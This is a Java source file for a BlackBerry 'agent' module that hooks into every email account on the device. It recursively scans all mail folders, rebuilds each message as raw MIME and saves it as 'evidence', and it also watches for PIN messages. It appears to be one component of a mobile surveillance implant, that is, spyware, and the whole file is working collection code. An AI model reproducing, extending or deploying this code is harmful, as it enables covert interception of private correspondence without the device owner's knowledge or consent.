//#preprocess
/**
 * 
 */
package blackberry.agent.mail;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Random;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Header;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.SendListener;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.blackberry.api.mail.event.FolderListener;
import net.rim.blackberry.api.mail.event.StoreEvent;
import net.rim.blackberry.api.mail.event.StoreListener;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;
import blackberry.agent.MessageAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.EvidenceType;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.utils.Check;
import blackberry.utils.DateTime;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving mail events. The class that is
 * interested in processing a mail event implements this interface, and the
 * object created with that class is registered with a component using the
 * component's <code>addMailListener<code> method. When
 * the mail event occurs, that object's appropriate
 * method is invoked.
 * 
 * @author user1
 */
public final class MailListener implements FolderListener, SendListener { //, StoreListener, SendListener {

    //#ifdef DEBUG
    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
    //#endif

    private static final int MAIL_VERSION = 2009070301;

    MessageAgent messageAgent;
    String[] names;
    private boolean collecting;

    protected static IntHashtable fieldTable;
    private static ServiceRecord[] mailServiceRecords;
    private Filter realtimeFilter;
    private Filter collectFilter;

    Random random = new Random();

    /**
     * Instantiates a new mail listener.
     * 
     * @param messageAgent_
     *            the message agent_
     */
    public MailListener(final MessageAgent messageAgent_) {
        messageAgent = messageAgent_;
    }

    private void addListeners(final Store store) {
        //#ifdef DEBUG
        debug.info("Adding listeners to store: " + store.toString());
        //#endif
        store.addFolderListener(this);
        store.addSendListener(this);
        //store.addStoreListener(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.StoreListener#batchOperation(net.rim
     * .blackberry.api.mail.event.StoreEvent)
     */
    public void batchOperation(final StoreEvent arg0) {
        //#ifdef DEBUG
        debug.info("batchOperation: " + arg0);
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesAdded(net.rim
     * .blackberry.api.mail.event.FolderEvent)
     */
    public void messagesAdded(final FolderEvent folderEvent) {
        final Message message = folderEvent.getMessage();
        final String folderName = message.getFolder().getFullName();

        final boolean added = folderEvent.getType() == FolderEvent.MESSAGE_ADDED;

        //#ifdef DEBUG
        debug.init();
        debug.info("Added Message: " + message + " folderEvent: " + folderEvent
                + " folderName: " + folderName);
        //#endif

        try {
            final int type = folderEvent.getType();
            if (type != FolderEvent.MESSAGE_ADDED) {
                //#ifdef DEBUG
                debug.info("filterMessage type: " + type);
                //#endif
                return;
            }

            //long lastcheck = messageAgent.getLastCheck(folderName);
            // realtime non guarda il lastcheck, li prende tutti.
            final int filtered = realtimeFilter.filterMessage(message, 0);
            if (filtered == Filter.FILTERED_OK) {
                final boolean ret = saveEvidence(message,
                        realtimeFilter.maxMessageSize, "local");
                //#ifdef DEBUG
                if (ret) {
                    debug.trace("messagesAdded: "
                            + message.getFolder().getName());
                }
                //#endif
            } else {
                //#ifdef DEBUG
                debug.trace("filter refused: " + filtered);
                //#endif
            }

            if (!collecting) {
                messageAgent.lastcheckSet("COLLECT", new Date());
                messageAgent.lastcheckSet(folderName, new Date());
            }

        } catch (final MessagingException ex) {
            //#ifdef DEBUG
            debug.error("cannot manage added message: " + ex);
            //#endif
        }
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesRemoved(net.
     * rim.blackberry.api.mail.event.FolderEvent)
     */
    public void messagesRemoved(final FolderEvent e) {
        final Message message = e.getMessage();
        //#ifdef DEBUG
        debug.init();
        debug.info("Removed Message" + message);
        //#endif

    }

    /**
     * Removes the listeners.
     * 
     * @param store
     *            the store
     */
    public void removeListeners(final Store store) {
        //#ifdef DEBUG
        debug.info("remove listeners");
        //#endif
        store.removeFolderListener(this);
        //store.removeSendListener(this);
        //store.removeStoreListener(this);
    }

    /**
     * Run.
     */
    public void run() {
        //final long timestamp = messageAgent.initMarkup();  
        //#ifdef DEBUG
        debug.init();
        //#endif

        collecting = true;
        // questa data rappresenta l'ultimo controllo effettuato.
        final Date lastCheckDate = messageAgent.lastcheckGet("COLLECT");

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
            names[count] = mailServiceRecords[count].getName();
            //#ifdef DEBUG
            debug.trace("Email account name: " + names[count]);
            //#endif

            Date lastCheckDateName = messageAgent.lastcheckGet(names[count]);

            //names[count] = mailServiceRecords[0].getName();
            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();

            final Folder[] folders = store.list();
            // Scandisco ogni Folder dell'account di posta
            scanFolders(names[count], folders, lastCheckDateName);

            messageAgent.lastcheckSet(names[count], new Date());
        }

        // al termine degli scanfolder
        messageAgent.lastcheckSet("COLLECT", new Date());

        //#ifdef DEBUG
        debug.trace("End search");
        //#endif

        collecting = false;

    }

    protected synchronized boolean saveEvidence(final Message message,
            final int maxMessageSize, final String storeName) {

        //#ifdef DBC
        Check.requires(message != null, "message != null");
        Check.requires(storeName != null, "storeName != null");
        //#endif

        //#ifdef DEBUG
        debug.trace("saveEvidence: " + message + " name: " + storeName);
        //#endif

        try {

            final int flags = 1;

            String from = "local";
            if (storeName.indexOf("@") > 0) {
                from = storeName;
            }
            final String mail = makeMimeMessage(message, maxMessageSize, from);
            //#ifdef DBC
            Check.asserts(mail != null, "Null mail");
            //#endif

            int size = message.getSize();
            if (size == -1) {
                size = mail.length();
            }

            final DateTime filetime = new DateTime(message.getReceivedDate());

            final byte[] additionalData = new byte[20];

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                    false);
            databuffer.writeInt(MAIL_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getFiledate());
            //#ifdef DBC
            Check.asserts(additionalData.length == 20,
                    "Mail Wrong buffer size: " + additionalData.length);
            //#endif

            //#ifdef DEBUG
            debug.trace("saveEvidence: "
                    + mail.substring(0, Math.min(mail.length(), 200)));
            //#endif

            messageAgent.createEvidence(additionalData, mail.getBytes("UTF-8"),
                    EvidenceType.MAIL_RAW);

            //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
            //		LogType.MAIL_RAW);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveEvidence message: " + ex);
            //#endif
            return false;

        }

        return true;
    }

    /**
     * scansione ricorsiva della directories.
     * 
     * @param name
     * @param subfolders
     *            the subfolders
     */
    public void scanFolders(final String storeName, final Folder[] subfolders,
            Date lastCheckDate) {
        Folder[] dirs;

        //#ifdef DBC
        Check.requires(subfolders != null && subfolders.length >= 0,
                "scanFolders");
        Check.requires(lastCheckDate != null, "scanFolders lastCheckDate null");
        Check.requires(collectFilter != null, "collectFilter == null");
        //#endif

        if (collectFilter == null) {
            //#ifdef DEBUG
            debug.trace("no collectFilter, messageAgent: " + messageAgent);
            //#endif
            if (messageAgent != null) {
                //#ifdef DEBUG
                debug.trace("new collectFilter");
                //#endif
                collectFilter = (Filter) messageAgent.filtersEMAIL
                        .get(Filter.TYPE_COLLECT);
            }
        }

        for (int count = 0; count < subfolders.length; count++) {

            final Folder folder = subfolders[count];
            final String folderName = folder.getFullName();
            //#ifdef DEBUG
            debug.info("Folder name: " + folderName + " lastCheckDate:"
                    + lastCheckDate);
            //debug.trace("  getName: " + folder.getName());
            //debug.trace("  getType: " + folder.getType());
            //debug.trace("  getId: " + folder.getId());

            //#endif
            dirs = folder.list();
            if (dirs != null && dirs.length >= 0) {
                scanFolders(storeName, dirs, lastCheckDate);
            }

            try {
                final Message[] messages = folder.getMessages();

                //#ifdef DEBUG
                debug.info("  lastCheck: " + lastCheckDate);
                debug.info("  numMessages: " + messages.length);
                //#endif

                //#ifdef PIN_MESSAGES
                lookForPinMessages(messages);
                //#endif

                boolean next = false;
                boolean updateMarker = true;

                // Scandisco ogni e-mail dell'account di posta
                for (int j = messages.length - 1; j >= 0 && !next; j--) {

                    try {
                        //#ifdef DEBUG
                        debug.trace("message # " + j);
                        //#endif

                        final Message message = messages[j];

                        //#ifdef DBC
                        Check.asserts(message != null,
                                "scanFolders: message != null");
                        //#endif

                        int flags = message.getFlags();
                        //#ifdef DEBUG
                        debug.trace("flags: " + flags);
                        //#endif
                        final int filtered = collectFilter.filterMessage(
                                message, lastCheckDate.getTime());

                        //#ifdef DEBUG
                        debug.trace("filtered: " + filtered);
                        //#endif

                        switch (filtered) {
                        case Filter.FILTERED_OK:
                            //#ifdef DBC
                            Check.asserts(storeName != null,
                                    "scanFolders: storeName != null");
                            //#endif

                            saveEvidence(message, collectFilter.maxMessageSize,
                                    storeName);

                            break;
                        case Filter.FILTERED_DISABLED:
                        case Filter.FILTERED_NOTFOUND:
                            updateMarker = false; //fallthrough, inibisce l'updateLastCheck
           
                        case Filter.FILTERED_LASTCHECK:
                        case Filter.FILTERED_DATEFROM:
                            next = true;
                            break;
                        }

                        //#ifdef DBC
                        int newflags = message.getFlags();
                        Check.asserts(flags == newflags, "scanFolders flags: "
                                + flags + " newflags: " + newflags);
                        //#endif

                    } catch (final Exception ex) {
                        //#ifdef DEBUG
                        debug.error("message # " + j + " ex:" + ex);
                        //#endif
                    }
                }

            } catch (final MessagingException e) {
                //#ifdef DEBUG
                debug.trace("Folder#getMessages() threw " + e.toString());
                //#endif
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("Scanning: " + ex);
                debug.error("Folder: " + folder);
                //#endif
            }
        }
    }

    private Date lookForPinMessages(final Message[] messages)
            throws MessagingException {

        //#ifdef DEBUG
        debug.trace("lookForPinMessages on: " + messages.length);
        //#endif

        // stampo le date.
        Date precRecDate = null;

        try {

            /* Date precSentDate = null; */
            for (int j = 0; j < messages.length; j++) {

                //debug.trace("1");
                final Message message = messages[j];
                if (precRecDate != null) {
                    //debug.trace("2");
                    //#ifdef DBC
                    Check.asserts(precRecDate.getTime() <= message
                            .getReceivedDate().getTime(),
                            "Wrong order Received: " + message.toString());
                    //#endif
                }
                //debug.trace("3");
                precRecDate = message.getReceivedDate();

                //debug.trace("4");
                Address address = null;
                try {
                    address = message.getFrom();
                } catch (Exception ex) {
                    //#ifdef DEBUG
                    debug.error(ex);
                    //#endif

                    //#ifdef DEBUG
                    debug.trace("lookForPinMessages: " + message.getBodyText());
                    //#endif

                }

                //debug.trace("5");
                if (message.getMessageType() == Message.PIN_MESSAGE) {
                    //#ifdef DEBUG
                    debug.info("PIN Message: " + message.getBodyText() + " s:"
                            + message.getSubject());
                    //#endif
                } else {
                    //debug.trace("6");
                    if (address != null) {
                        //debug.trace("7");
                        final String name = address.getName();
                        if (name != null && name.length() == 8
                                && name.indexOf("@") == -1
                                && name.indexOf(" ") == -1) {

                            //#ifdef DEBUG
                            debug.info("probably PIN Message From: " + name);
                            debug.trace("  s: " + message.getSubject());
                            debug.trace("  b: " + message.getBodyText());
                            //#endif
                        }

                    }

                    //debug.trace("8");

                    Address[] addresses = null;

                    try {
                        addresses = message
                                .getRecipients(Message.RecipientType.TO);
                    } catch (Exception ex) {
                        //#ifdef DEBUG
                        debug.error(ex);
                        //#endif
                    }
                    //debug.trace("9");
                    if (addresses != null) {
                        for (int i = 0; i < addresses.length; i++) {
                            address = addresses[i];
                            if (address != null) {

                                final String name = address.getAddr();
                                if (name != null && name.length() == 8
                                        && name.indexOf("@") == -1
                                        && name.indexOf(" ") == -1) {

                                    //#ifdef DEBUG
                                    debug.trace("probably PIN Message To: "
                                            + name);
                                    debug.trace("  s: " + message.getSubject());
                                    debug
                                            .trace("  b: "
                                                    + message.getBodyText());
                                    //#endif
                                }
                            }
                        }
                    }
                }

            }

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

        return precRecDate;
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.SendListener#sendMessage(net.rim.blackberry
     * .api.mail.Message)
     */
    public boolean sendMessage(final Message message) {

        //#ifdef DEBUG
        debug.init();
        debug.trace("sending: " + message.getBodyText());
        //#endif
        //TODO: enable only if actually needed
        return true;

        /*
         * if (collecting) { //#ifdef DEBUG
         * debug.trace("sendMessage: ignoring, still collecting"); //#endif
         * return true; } try { final int filtered =
         * realtimeFilter.filterMessage(message, messageAgent.lastcheck); if
         * (filtered == Filter.FILTERED_OK) { //TODO: enable saveLog, only if
         * needed saveLog(message, realtimeFilter.maxMessageSize, "local");
         * //#ifdef DEBUG
         * message.getFolder().getName()); //#endif } } catch (final
         * MessagingException ex) { //#ifdef DEBUG
         * debug.error("cannot manage send message: " + ex); //#endif return
         * true; } messageAgent.updateMarkup(); return true;
         */
    }

    private String makeMimeMessage(final Message message,
            final int maxMessageSize, final String from) {
        final Address[] addresses;

        final StringBuffer mailRaw = new StringBuffer();

        // costruisce gli header
        addAllHeaders(message.getAllHeaders(), mailRaw);
        addFromHeaders(message.getAllHeaders(), mailRaw, from);

        // decode del mime, separo text da html
        final MailParser parser = new MailParser(message);
        final Mail mail = parser.parse();

        //#ifdef DEBUG
        debug.trace("Email size: " + message.getSize() + " bytes");
        debug.trace("Sent date: " + message.getSentDate());
        debug.trace("Subject: " + message.getSubject());
        //debug.trace("Body text: " + message.getBodyText());
        //#endif

        // comincia la ricostruzione del MIME
        mailRaw.append("MIME-Version: 1.0\r\n");
        final long rnd = Math.abs(random.nextLong());
        final String boundary = "------_=_NextPart_" + rnd;

        if (mail.isMultipart()) {
            mailRaw.append("Content-Type: multipart/alternative; boundary="
                    + boundary + "\r\n");
            mailRaw.append("\r\n--" + boundary + "\r\n");
        }

        if (mail.hasText()) {
            mailRaw.append(mail.plainTextMessageContentType);
            String msg = mail.plainTextMessage;
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "\r\n");
        }

        if (mail.hasHtml()) {
            //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
            //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
            mailRaw.append(mail.htmlMessageContentType);
            mailRaw.append(mail.htmlMessage);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "--\r\n");
        }

        // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
        if (mail.isEmpty()) {
            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");

            String msg = message.getBodyText();
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        mailRaw.append("\r\n");

        final String craftedMail = mailRaw.toString();

        return craftedMail;
    }

    /**
     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message
     * originale
     * 
     * @param headers
     * @param mail
     */
    private void addAllHeaders(final Enumeration headers,
            final StringBuffer mail) {

        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                mail.append(header.getName());
                mail.append(header.getValue());
                mail.append("\r\n");
            } else {
                //#ifdef DEBUG
                debug.error("Unknown header type: " + headerObj);
                //#endif
            }
        }
    }

    /**
     * Il metodo addAllHeaders non estrae il campo from. Occorre specificarglelo
     * esplicitamente.
     * 
     * @param headers
     * @param mail
     * @param from
     */
    private void addFromHeaders(final Enumeration headers,
            final StringBuffer mail, final String from) {

        boolean fromFound = false;
        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                if (header.getName().startsWith("From")) {
                    fromFound = true;
                }
            }
        }
        if (!fromFound) {
            //#ifdef DEBUG
            debug.info("Adding from: " + from);
            //#endif
            mail.append("From: " + from + "\r\n");
        }
    }

    /**
     * Start.
     */
    public void start() {

        final ServiceBook serviceBook = ServiceBook.getSB();
        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
        //mailServiceRecords = serviceBook.getRecords();

        names = new String[mailServiceRecords.length];
        //#ifdef DEBUG
        debug.trace("Starting: " + mailServiceRecords.length + " accounts");
        //#endif

        // to forever
        realtimeFilter = (Filter) messageAgent.filtersEMAIL
                .get(Filter.TYPE_REALTIME);

        // history
        collectFilter = (Filter) messageAgent.filtersEMAIL
                .get(Filter.TYPE_COLLECT);

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            try {
                final ServiceConfiguration sc = new ServiceConfiguration(
                        mailServiceRecords[count]);
                final Store store = Session.getInstance(sc).getStore();
                addListeners(store);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error("Cannot add listener. Count: " + count);
                //#endif
            }
        }

        //#ifdef DEBUG
        debug.trace("Started");
        //#endif
    }

    /**
     * Stop.
     */
    public void stop() {
        //#ifdef DEBUG
        debug.trace("Stopping");
        //#endif
        if (mailServiceRecords != null) {
            for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

                final ServiceConfiguration sc = new ServiceConfiguration(
                        mailServiceRecords[count]);
                final Store store = Session.getInstance(sc).getStore();
                removeListeners(store);
            }
        }
        //#ifdef DEBUG
        debug.trace("Stopped");
        //#endif
    }

    public boolean haveNewAccount() {
        final ServiceBook serviceBook = ServiceBook.getSB();
        ServiceRecord[] actualServiceRecords = serviceBook
                .findRecordsByCid("CMIME");

        if (actualServiceRecords.length != mailServiceRecords.length) {
            //#ifdef DEBUG
            debug.info("haveNewAccount: len");
            //#endif
            return true;
        }

        for (int i = 0; i < actualServiceRecords.length; i++) {
            if (actualServiceRecords[i] != mailServiceRecords[i]) {
                //#ifdef DEBUG
                debug.info("haveNewAccount: " + i);
                //#endif
                return true;
            }
        }

        return false;
    }

}
